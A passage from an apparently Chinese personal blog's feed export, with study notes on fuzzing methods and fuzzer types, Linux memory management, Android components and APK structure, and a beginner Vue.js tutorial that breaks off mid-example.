title="5、自动协议生成测试"></a>5、自动协议生成测试</h3><p>在此种方法中，首先要做的是对被测应用进行研究，理解和解释协议规约或文件定义，这种方法基于创建一个描述协议规约如何工作的文法(grammar)。采用这种方法，可以识别出数据包或是文件中静态或动态的部分，动态的部分就是可以被模糊化变量替代的部分。随后，模糊测试器动态分析包含了静态和动态部分的模板，生成模糊测试数据，将结果数据包或是文件发送给被测应用。</p><ul><li><p>优点：是一种更高级的强制性方法</p></li><li><p>缺点：需要花较多时间在生成文法或是数据格式的定义上</p></li></ul><h2 id="模糊测试器类型"><a href="#模糊测试器类型" class="headerlink" title="模糊测试器类型"></a>模糊测试器类型</h2><h3 id="本地模糊测试器"><a href="#本地模糊测试器" class="headerlink" title="本地模糊测试器"></a>本地模糊测试器</h3><p>命令行模糊测试器、环境变量模糊测试器、文件格式模糊测试器</p><h3 id="远程模糊测试器"><a href="#远程模糊测试器" class="headerlink" title="远程模糊测试器"></a>远程模糊测试器</h3><h4 id="1、网络协议模糊测试器"><a href="#1、网络协议模糊测试器" class="headerlink" title="1、网络协议模糊测试器"></a>1、网络协议模糊测试器</h4><p>网络协议模糊测试器主要分为两个类别：面向简单协议的模糊测试器和面向复杂协议的模糊测试器</p><h5 id="简单协议"><a href="#简单协议" class="headerlink" title="简单协议"></a>简单协议</h5><p>简单协议通常仅有简单的认证或根本没有认证。这类协议通常基于可打印的ASCII字符而不是二进制数据，简单协议不会包含长度或是校验域。比如FTP协议，在FTP协议中，所有控制信道上的通信都使用ASCII文本，对认证来说，只需要简单文本形式的用户名和口令就可以完成认证。</p><h5 id="复杂协议"><a href="#复杂协议" class="headerlink" title="复杂协议"></a>复杂协议</h5><p>复杂协议通常由二进制数据和偶尔包含的人可读的ASCII字符串构成。认证可能需要通过加密或是某种形式的混淆来实现，比如微软远程过程调用(MSRPC)协议就是一个复杂的协议，它是一种二进制协议，在数据传输之前需要经过好几个步骤才能建立通信信道，协议需要长度描述域和分解域。</p><h4 id="2、Web应用模糊测试器"><a href="#2、Web应用模糊测试器" class="headerlink" title="2、Web应用模糊测试器"></a>2、Web应用模糊测试器</h4><h4 id="3、Web浏览器模糊测试器"><a href="#3、Web浏览器模糊测试器" class="headerlink" title="3、Web浏览器模糊测试器"></a>3、Web浏览器模糊测试器</h4><h3 id="内存模糊测试器"><a href="#内存模糊测试器" class="headerlink" title="内存模糊测试器"></a>内存模糊测试器</h3><p>内存模糊测试器的一种实现方法是对进程执行一次快照，在生成快照后迅速向该进程的输入处理子例程中注入故障数据。当执行完一个测试用例后，恢复上次的快照并注入新的数据，重复以上所有过程直到所有测试用例都执行完成。</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>快速：这种方法不需要带宽，甚至在测试过程中不需要执行从网络上接收数据包到实际解析数据包之间的代码，由此提升了测试性能</li><li>捷径：如果一个协议使用了定制的加密或是压缩算法，或是程序内到处都是数据校验代码，在这种情况下，内存模糊测试器能够在解压，解密或是数据校验完成后的某个时间点创建一个快照，这样就避免了花费时间创建一个能够处理加密、压缩或是数据校验的模糊测试器</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>假相：内存模糊测试是直接将数据注入进程的地址空间，因此有可能被注入的数据根本不可能通过从外部源输入的数据来产生</li><li>可重现性：虽然一个异常可能预示着一个可被利用的漏洞，但就算通过内存模糊测试发现了这样的异常，测试者仍需要从外部输入找到重现这个异常的外部数据，而找到外部数据可能非常耗时。</li><li>复杂性：实现内存模糊测试非常复杂</li></ul><h2 id="模糊测试框架"><a href="#模糊测试框架" class="headerlink" title="模糊测试框架"></a>模糊测试框架</h2><p>模糊测试框架可用于对多种目标进行模糊测试。模糊测试框架就是一个通用的模糊测试器或是通用的模糊测试库，它简化了多种不同类型的测试目标需要的数据格式，如SPIKE和Peach工具。</p><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ul><li>可重用性：在模糊测试不同目标时，该框架可以被反复使用</li><li>社区介入：多个社区开发者共同开发</li></ul><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ul><li>局限性</li><li>负责性</li><li>开发时间：开发极其耗时</li></ul><h1 id="常用的协议元素"><a href="#常用的协议元素" class="headerlink" title="常用的协议元素"></a>常用的协议元素</h1><h2 id="名字-值对"><a href="#名字-值对" class="headerlink" title="名字-值对"></a>名字-值对</h2><p>无论是二进制协议还是简单文本协议，其中的数据经常以名字-值对(如size=11)的形式表示。一个一般性规则是，通过对名字-值对中的值进行模糊测试，通常可以发现潜在的安全漏洞。</p><h2 id="块识别符"><a href="#块识别符" class="headerlink" title="块识别符"></a>块识别符</h2><p>块识别符是用来标识二进制数据块的数据类型。模糊测试可以发现一些文档中没有记录的块识别符，这些文档中没有记录的块识别符可能会接受额外的数据类型，并带来安全风险，因此需要进行模糊测试</p><h2 id="块大小"><a href="#块大小" class="headerlink" title="块大小"></a>块大小</h2><p>块通常由诸如名字-值对这样的数据，以及紧挨着数据的一个或多个字节组成。紧挨着数据前方的这些字节用于说明块中的数据类型、块的大小。如果要替换块中的数据进行模糊测试，一定要根据实际数据的大小调整块大小的值，只有这样，被测应用才能准确识别数据块中的数据。</p><h3 id="缓冲区溢出和缓冲区下溢发现"><a href="#缓冲区溢出和缓冲区下溢发现" class="headerlink" title="缓冲区溢出和缓冲区下溢发现"></a>缓冲区溢出和缓冲区下溢发现</h3><p>修改数据包中表示块大小的值，使其比实际数据块的大小稍大或稍小一些，然后观察结果输出。</p><h2 id="校验和"><a href="#校验和" class="headerlink" title="校验和"></a>校验和</h2><p>如果文件包含校验和，应用程序通常会在发现校验和不正确后放弃对文件的处理，因此会影响模糊测试。PNG图像格式采用了校验和，在对带校验和的文件格式进行模糊测试时，务必要让模糊测试器把校验和考虑在内，模糊测试器可以自行计算校验和并将其写入文件，这样就可以保证被测应用能够正常处理用于模糊测试的文件。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> Fuzzing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux(1)</title>
      <link href="/2020/10/10/linux1/"/>
      <url>/2020/10/10/linux1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-什么是Linux"><a href="#1-什么是Linux" class="headerlink" title="1. 什么是Linux"></a>1. 什么是Linux</h2><h3 id="1-1-Linux系统内部结构"><a href="#1-1-Linux系统内部结构" class="headerlink" title="1.1 Linux系统内部结构"></a>1.1 Linux系统内部结构</h3><p>Linux可划分为以下四部分：</p><ul><li>Linux内核</li><li>GNU工具组件</li><li>图形化桌面环境</li><li>应用软件</li></ul><p>下图是linux系统的基本结构框图，说明了各个部分是如何协作起来构成整个linux系统的</p><p><img src="https://pic.downk.cc/item/5f8161e41cd1bbb86beee9d3.jpg" alt=""></p><h4 id="1-1-1-linux内核"><a href="#1-1-1-linux内核" class="headerlink" title="1.1.1 linux内核"></a>1.1.1 linux内核</h4><p>linux系统的核心是内核。内核控制着计算机系统上的所有硬件和软件。内核基本负责以下四项基本功能：</p><ul><li>系统内存管理</li><li>软件程序管理</li><li>硬件设备管理</li><li>文件系统管理</li></ul><h5 id="1-1-1-1-系统内存管理"><a href="#1-1-1-1-系统内存管理" class="headerlink" title="1.1.1.1 系统内存管理"></a>1.1.1.1 系统内存管理</h5><p>内核管理服务器上的可用物理内存，还可以创建和管理虚拟内存。</p><ul><li>交换空间(swap space):内核通过硬盘上的存储空间来实现虚拟内存，这块区域被称为交换空间。</li><li>虚拟内存：内核不断地在交换空间和物理内存之间反复交换虚拟内存存储单元中的内容</li><li>页面：内存存储单元会被按组分成很多块，这些块被称作页面。内核会将每个内存页面放在物理内存或交换空间。然后，内核会维护一个内存页面表，来指明哪些页面位于物理内存内，哪些页面被换到磁盘上。</li></ul><p>内核会记录哪些内存页面正在使用中，并自动把一段时间未访问的内存页面复制到交换空间区域(换出，swapping out)——即使物理内存还有可用内存。当程序要访问一个已被换出的内存页面时，内核必须从物理内存换出另外一个内存页面来给它让出空间，然后从交换空间换入(swapping in)请求的内存页面。</p><blockquote><p>只要linux系统在运行，为运行中的程序换出内存页面的过程就不会停歇</p></blockquote><p>查看/proc/meminfo 文件可以观察linux系统上虚拟内存的当前状态</p><pre><code>cat /proc/meminfo</code></pre><p><img src="https://pic.downk.cc/item/5f816e571cd1bbb86bfd24f5.png" alt=""></p><p><strong>共享内存</strong></p><p>默认情况下，运行在Lnux系统上的每个进程都有各自的内存页面，进程不能访问其他进程正在使用的内存页面。内核维护着它自己的内存区域。出于安全考虑，用户进程不能访问内核进程使用的内存。</p><ul><li>共享内存页面：为了方便共享数据，可以创建一些共享内存页面。多个进程可在同一块共用内存区域进行读取和写入操作。内核负责维护和管理这块共用内存区域并控制每个进程访问这块共享区域。</li></ul><p>可使用以下命令查看系统上的当前共享内存页面</p>]]></content>
      
      
      <categories>
          
          <category> 知识点总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>android开发与基础</title>
      <link href="/2020/09/03/android2/"/>
      <url>/2020/09/03/android2/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="Android-SDK"><a href="#Android-SDK" class="headerlink" title="Android SDK"></a>Android SDK</h3><p>Android SDK 工具会将代码连同任何数据和资源文件编译成一个 APK（<em>Android 软件包</em>），即带有 <code>.apk</code> 后缀的归档文件。一个 APK 文件包含 Android 应用的所有内容，它也是 Android 设备用来安装应用的文件。</p><h3 id="Android安全功能保护"><a href="#Android安全功能保护" class="headerlink" title="Android安全功能保护"></a>Android安全功能保护</h3><p>每个 Android 应用都处于各自的安全沙盒中，并受以下安全功能的保护:</p><ul><li>Android 操作系统是一种多用户 Linux 系统，其中的每个应用都是一个不同的用户；</li><li>默认情况下，系统会为每个应用分配一个唯一的 Linux 用户 ID（该 ID 仅由系统使用，应用并不知晓）。系统会为应用中的所有文件设置权限，使得只有分配给该应用的用户 ID 才能访问这些文件；</li><li>每个进程都拥有自己的虚拟机 (VM)，因此应用代码独立于其他应用而运行。</li><li>默认情况下，每个应用都在其自己的 Linux 进程内运行。Android 系统会在需要执行任何应用组件时启动该进程，然后当不再需要该进程或系统必须为其他应用恢复内存时，其便会关闭该进程。</li></ul><h4 id="共享数据和访问服务"><a href="#共享数据和访问服务" class="headerlink" title="共享数据和访问服务"></a>共享数据和访问服务</h4><p>Android 系统实现了<em>最小权限原则</em>。每个应用只能访问执行其工作所需的组件，而不能访问其他组件。不过，应用仍可通过一些途径与其他应用共享数据以及访问系统服务：</p><ul><li>可以安排两个应用共享同一 Linux 用户 ID，在此情况下，二者便能访问彼此的文件。为节省系统资源，也可安排拥有相同用户 ID 的应用在同一 Linux 进程中运行，并共享同一 VM。应用还必须使用相同的证书进行签名。</li><li>应用可以请求访问设备数据（如用户的联系人、短信消息、可装载存储装置（SD 卡）、相机、蓝牙等）的权限。用户必须明确授予这些权限</li></ul><h2 id="应用组件"><a href="#应用组件" class="headerlink" title="应用组件"></a>应用组件</h2><p>应用组件是 Android 应用的基本构建块。每个组件都是一个入口点，系统或用户可通过该入口点进入您的应用。有些组件会依赖于其他组件。一共有四种不同的应用组件：</p><ul><li>Activity</li><li>服务</li><li>广播接收器</li><li>内容提供程序</li></ul><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p><em>Activity</em> 是与用户交互的入口点。它表示拥有界面的单个屏幕。例如，电子邮件应用可能有一个显示新电子邮件列表的 Activity、一个用于撰写电子邮件的 Activity 以及一个用于阅读电子邮件的 Activity,每个 Activity 都独立于其他 Activity 而存在。Activity 有助于完成系统和应用程序之间的以下重要交互：</p><ul><li>追踪用户当前关心的内容（屏幕上显示的内容），以确保系统继续运行托管 Activity 的进程。</li><li>了解先前使用的进程包含用户可能返回的内容（已停止的 Activity），从而更优先保留这些进程。</li><li>帮助应用处理终止其进程的情况，以便用户可以返回已恢复其先前状态的 Activity。</li><li>提供一种途径，让应用实现彼此之间的用户流，并让系统协调这些用户流。（此处最经典的示例是共享。）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 项目开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓逆向(1)</title>
      <link href="/2020/08/26/android1/"/>
      <url>/2020/08/26/android1/</url>
      
        <content type="html"><![CDATA[<h2 id="apk文件结构"><a href="#apk文件结构" class="headerlink" title="apk文件结构"></a>apk文件结构</h2><p><img src="https://pic.downk.cc/item/5f47161b160a154a67245cd5.png" alt=""></p><ol><li><p>assets文件夹(可选)：用来存放需要打包到android应用程序的静态资源文件，不需要通过appt编译的资源，没有索引</p></li><li><p>lib文件夹(可选)：存放当前app用得到的so文件，so文件是利用C/C++代码实现的</p></li><li><p>META-INF文件就是证书签名文件 (必须):</p><ul><li>MANIFEST.MF(摘要文件)：程序遍历APK包中的所有文件，对非文件夹非签名文件的文件，逐个用SHA1生成摘要信息，再使用Base64进行编码，如果APK包的文件被修改，在APK安装校验时，被修改的文件与MANIFSET.MF的校验信息不同，程序将无法正常安装</li><li>CERT.SF(对摘要文件的签名文件)：对生成的MANIFEST.MF文件利用SHA1-RSA算法对开发者的私钥进行签名。在安装时只有公共密钥才能对其解密。解密之后将其与未加密的摘要信息进行比对，如果相符则文件没有被修改。修改文件之后要重新签名才能安装成功。</li><li>INDEX.LIST APK索引文件目录</li><li>CERT.RSA 保存公钥、加密算法等信息 </li></ul></li><li><p>res文件夹：存放应用的资源文件，包括图片资源、字符串资源、颜色资源、尺寸资源等，这个目录下的资源都会出现在资源清单文件R.java的索引中，需要通过appt编译的资源，在资源索引表中会生成索引</p></li><li><p>AndroidManifest.xml：Android项目的系统清单文件，Android应用的四大组件(Activity/Service/BroadcastReceiver/ContentProvide)均在此配置和声明</p></li><li><p>classes.dex:存放Java代码，应用程序的可执行文件，如果当前APP的方法数超过65535，就会进行分包处理(有多个dex文件)，如果没有超过，则只有一个dex文件。Android的所有代码都集中于此，可以通过反编译工具dex2jar转化为jar包，再通过jd-hgui查看其代码</p></li><li><p>resources.arsc:资源索引表，用来描述具有ID值的资源的配置信息。</p></li></ol><h2 id="APK打包流程"><a href="#APK打包流程" class="headerlink" title="APK打包流程"></a>APK打包流程</h2><p><img src="https://pic.downk.cc/item/5f471e0f160a154a672a0a39.png" alt=""></p><h2 id="APK安装流程"><a href="#APK安装流程" class="headerlink" title="APK安装流程"></a>APK安装流程</h2><h3 id="涉及目录"><a href="#涉及目录" class="headerlink" title="涉及目录"></a>涉及目录</h3><ul><li>system/app: 系统自带的应用程序，获得adb root权限才能删除</li><li>data/app: 用户程序安装的目录，安装时把apk文件复制到此目录</li><li>data/data: 存放应用程序的数据</li><li>data/dalvik-cache: 将apk中的dex文件安装到dalvik-cache目录下(dex文件是dalvik虚拟机的可执行文件，其大小约为原始apk文件大小的四分之一)</li></ul><h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><ol><li>复制APK安装包到data/app目录下，解压并扫描安装包</li><li>把dex文件(Dalvik字节码)保存到dalvik-cache目录</li><li>在data/data目录下创建对应的应用数据目录</li></ol><h3 id="卸载过程"><a href="#卸载过程" class="headerlink" title="卸载过程"></a>卸载过程</h3><p>删除安装过程中在上述三个目录下创建的文件及目录</p><h2 id="分析ELF文件"><a href="#分析ELF文件" class="headerlink" title="分析ELF文件"></a>分析ELF文件</h2><p>操作系统 | 可执行文件 | 动态链接库</p><p>-|-|-</p><p>windows | PE文件 |.dll文件</p><p>linux | ELF可执行文件 | .so文件</p><p>Android操作系统(linux内核) |  ELF/.dex文件 |  </p><h2 id="Android系统架构"><a href="#Android系统架构" class="headerlink" title="Android系统架构"></a>Android系统架构</h2><p><img src="https://pic.downk.cc/item/5f48b039160a154a67a5c0b8.png" alt=""></p><blockquote><p>android runtime包括安卓开发核心库和dalvik虚拟机</p></blockquote><h2 id="Android开发"><a href="#Android开发" class="headerlink" title="Android开发"></a>Android开发</h2><p>利用android studio生成app项目，项目结构(<a href="https://www.jianshu.com/p/4962b4eeec63" target="_blank" rel="noopener">https://www.jianshu.com/p/4962b4eeec63</a>)</p><h3 id="Android四大组件"><a href="#Android四大组件" class="headerlink" title="Android四大组件"></a>Android四大组件</h3><ul><li>活动(activity):用于表现功能</li><li>服务(service): 后台运行服务，不提供界面呈现</li><li>广播接收者(Broadcast Receive): 用于接收广播</li><li>内容提供者(Content Provider):支持多个应用中存储和读取数据 相当于数据库</li></ul><h3 id="Activity-活动"><a href="#Activity-活动" class="headerlink" title="Activity 活动"></a>Activity 活动</h3><p>activity代表一次app的运行过程</p><h5 id="activity生命周期"><a href="#activity生命周期" class="headerlink" title="activity生命周期"></a>activity生命周期</h5><p><img src="https://pic.downk.cc/item/5f48c815160a154a67ac8986.png" alt=""></p><blockquote><p>对话框不调用onStop()</p></blockquote><h5 id="创建activity"><a href="#创建activity" class="headerlink" title="创建activity"></a>创建activity</h5><p>活动必须继承activity类</p><pre><code>public class MainActivity extends AppCompatActivity {          protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);//绑定布局}</code></pre><h3 id="服务Service"><a href="#服务Service" class="headerlink" title="服务Service"></a>服务Service</h3><p>Android中的服务，与Activity不同，它是不能与用户交互，不能自己启动，运行在后台的程序，如果我们退出应用时，Service进程并没有结束，它仍然在后台运行，比如音乐播放，我们将音乐软件最小化，就可以一边听音乐一边干其他的事，如果不用Service，我们就听不到歌了。</p><h4 id="Service生命周期"><a href="#Service生命周期" class="headerlink" title="Service生命周期"></a>Service生命周期</h4><p>Service只继承了onCreate(),onStart(),onDestroy()三个方法，当我们第一次启动Service时，先后调用了onCreate(),onStart()两个方法，当停止Service时，则执行onDestroy()方法，如果Service已经启动，当我们再次启动Service时，不会执行onCreate()方法，而是执行onStart()方法。</p><h5 id="startService启动Service的生命周期"><a href="#startService启动Service的生命周期" class="headerlink" title="startService启动Service的生命周期"></a>startService启动Service的生命周期</h5><p>执行startService时，Service会经历onCrteate()-&gt;onStartCommand。当执行stopService时，直接调用onDestroy方法，调用者如果没有stopService，Service会一直在后台运行，下次调用者 再起来仍然可以stopService。</p><h5 id="bindService启动Service的生命周期"><a href="#bindService启动Service的生命周期" class="headerlink" title="bindService启动Service的生命周期"></a>bindService启动Service的生命周期</h5><p>执行bindService时，Service会经历onCreate-&gt;onBind，这个时候调用者和Service绑定在一起。调用者调用unbindService()方法或者调用者Context不存在了，Service就会调用onUnbind-&gt;onDestroy。这里的绑定在一起就是说两者共存亡了。</p><h3 id="广播接收者Broadcast-Receive"><a href="#广播接收者Broadcast-Receive" class="headerlink" title="广播接收者Broadcast Receive"></a>广播接收者Broadcast Receive</h3><p>用于接收广播，广播接收器可以自由的对自己感兴趣的广播进行注册，当检测到有对应的广播发出的时候能够接收广播，并作出相应的处理。</p><h4 id="注册广播的方式"><a href="#注册广播的方式" class="headerlink" title="注册广播的方式"></a>注册广播的方式</h4><ul><li>静态注册：在androidMainfest.xml中注册</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 安卓 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue</title>
      <link href="/2020/07/29/vue1/"/>
      <url>/2020/07/29/vue1/</url>
      
        <content type="html"><![CDATA[<h2 id="Vue基础"><a href="#Vue基础" class="headerlink" title="Vue基础"></a>Vue基础</h2><h3 id="Vue简介"><a href="#Vue简介" class="headerlink" title="Vue简介"></a>Vue简介</h3><ul><li>Vue是一个Javascript框架</li><li>简化DOM操作(基于虚拟DOM，一种可以预先通过javascript进行各种计算，把最终的DOM操作计算出来并优化的技术)</li><li>响应式数据驱动，页面由数据生成，当数据发生改变时页面也会发生改变</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装HBuilderX编辑器，再在here(cn.vuejs.org)下载开发版本vue源码，得到vue.js文件，将vue.js文件放入一个文件夹中，通过HBuilderX打开此文件夹，就创建了一个新项目。</p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>在项目中新建一个html文件，在html文件中通过javascript代码引入vue:</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>vue.js<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="Vue使用"><a href="#Vue使用" class="headerlink" title="Vue使用"></a>Vue使用</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>Vue.js 的核心是一个允许采用简洁的模板语法来声明式地将数据渲染进 DOM 的系统：</p><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  {{ message }}   //声明变量，文本插值表达式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>js:</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//id取值</span>  data<span class="token punctuation">:</span> <span class="token punctuation">{</span>    message<span class="token punctuation">:</span> <span class="token string">'Hello Vue!'</span>  <span class="token comment" spellcheck="true">//在视图(html)中声明了哪些变量，就需要在data中进行注册，并进行出书和赋值</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>右侧预览(要先保存才会有显示)</p><p><img src="https://pic.downk.cc/item/5f20f2d414195aa5940cb8b6.png" alt=""></p><p>通过上述方式，我们就不需要直接和HTML直接进行交互了，一个Vue应用会将其挂载到一个DOM元素上(在此例中是#app)然后对其完全控制。HTML是我们的入口，但是其余都会发生在新创建的Vue实例内部。</p><h3 id="el挂载点"><a href="#el挂载点" class="headerlink" title="el挂载点"></a>el挂载点</h3><p>Vue会管理el选项名中的元素及其内部的后代元素</p><p>选择器：</p><ul><li>el:”#app”  id选择器</li><li>el:”.app”  类选择器</li><li>el:”div” 标签选择器</li></ul><blockquote><p>注：在实际开发中建议使用id选择器</p></blockquote><h3 id="data数据类型"><a href="#data数据类型" class="headerlink" title="data数据类型"></a>data数据类型</h3><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>如上</p><h4 id="对象型"><a href="#对象型" class="headerlink" title="对象型"></a>对象型</h4><p>js:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          data<span class="token punctuation">:</span><span class="token punctuation">{</span>              school<span class="token punctuation">:</span><span class="token punctuation">{</span>                  name<span class="token punctuation">:</span><span class="token string">"zby"</span><span class="token punctuation">,</span>                  age<span class="token punctuation">:</span><span class="token number">18</span>              <span class="token punctuation">}</span><span class="token punctuation">,</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>{{school.name}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h4 id="数组型"><a href="#数组型" class="headerlink" title="数组型"></a>数组型</h4><p>js:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>          data<span class="token punctuation">:</span><span class="token punctuation">{</span>              array<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>html:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>{{array[0]}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>{{array[1]}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>{{array[2]}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>{{array[3]}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h2 id="Vue的本地应用"><a href="#Vue的本地应用" class="headerlink" title="Vue的本地应用"></a>Vue的本地应用</h2><p>使用Vue指令开发应用</p><h3 id="内容绑定，事件绑定"><a href="#内容绑定，事件绑定" class="headerlink" title="内容绑定，事件绑定"></a>内容绑定，事件绑定</h3><h4 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h4><p>设置标签的文本值</p><p>js:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> app 